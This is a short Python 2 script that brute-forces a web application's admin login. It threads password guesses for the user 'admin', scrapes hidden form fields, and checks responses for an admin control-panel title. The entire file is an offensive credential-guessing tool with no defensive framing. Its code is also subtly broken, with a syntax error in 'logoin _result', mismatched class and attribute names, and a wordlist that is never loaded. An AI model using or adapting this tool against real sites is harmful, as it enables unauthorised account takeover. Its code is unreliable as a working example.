#!/bin/python
import urllib2,urllib,cookielib,threading,sys,Queue
from HTMLParser import HTMLParser
user_thread=10
username='admin'
wordlist='passwd.txt'
resume=None
target_url=raw_input('Target:')
target_post=raw_input('Post:')
username_field='username'
password_field='passwd'
success_check='Administration - Control Panel'
class Bruter(object):
    def __init__(self,username,words):
        self.username=username
        self.password_q=words
        self.found=False
        print 'Finished setting up for %s'%username
    def run_bruteforce(self):
        for i in range(user_thread):
            t=threading.Thread(target=self.web_bruter)
            t.start()
    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute=self.password_q.get().rsplit()
            jar=cookielib.FileCookieJar('cookies')
            opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            response=opener.open(target_url)
            page=response.read()
            print 'Trying: %s : %s (%d left)'%(self.username,brute,self.password_q.qsize())
            parser=BruterParser()
            parser.feed(page)
            post_tags=parser.tar_results
            post_tags[username_field]=self.username
            post_tags[password_field]=brute
            login_data=urllib.urlencode(post_tags)
            login_response=opener.open(target_post,login_data)
            login_result=login_response.read()
            if success_check in logoin _result:
                self.found=True
                print '[*] Bruteforce successful.'
                print '[*] Uersname: %s'%username
                print '[*] Password: %s'%brute
                print '[*] Waiting for other threads to exit...'
class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_result={}
    def handle_starttag(self,tag,attrs):
        if tag == 'input':
            tag_name=None
            tag_value=None
            for name,value in atter:
                if name=='name':
                    tag_name=value
                if name=='value':
                    tag_value=value
            if tag_name is not None:
                self.tag_result[tag_name]=tag_value
        
                    
